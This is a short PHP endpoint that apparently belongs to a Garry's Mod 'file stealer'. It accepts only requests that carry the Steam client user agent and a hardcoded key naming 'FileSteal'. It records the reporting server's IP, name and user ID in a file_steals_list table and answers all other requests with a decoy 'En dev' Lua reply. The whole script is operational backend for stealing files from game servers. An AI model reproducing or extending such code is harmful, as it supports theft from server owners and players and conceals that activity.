<?php
$browser = $_SERVER['HTTP_USER_AGENT'];
include('class/include.php');

if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {

	if($_POST['keyd'] != "AnatikLeBestHaxorDeGmodQuoiNanJdecIlPueLaMerdeFileStealMadeByRayanFR"){
		die("print('En dev2')");
	}
	$ip = $_POST['ip'];
	$name = $_POST['name'];
	$id = $_POST['id'];

			if ($GLOBALS['DB']->Count("file_steals_list", ["ip" => $ip]) == 0){
				if($id == 0 || $GLOBALS['DB']->Count('users', ['id' => $id]) == 0 ){
				$GLOBALS['DB']->Insert("file_steals_list", ["ip" => $ip, "name" => $name, "userid" => 0]);
			}else{
			$GLOBALS['DB']->Insert("file_steals_list", ["ip" => $ip, "name" => $name, "userid" => $id]);
			}
			}

}else{
	die("print('En dev')");
}

?> 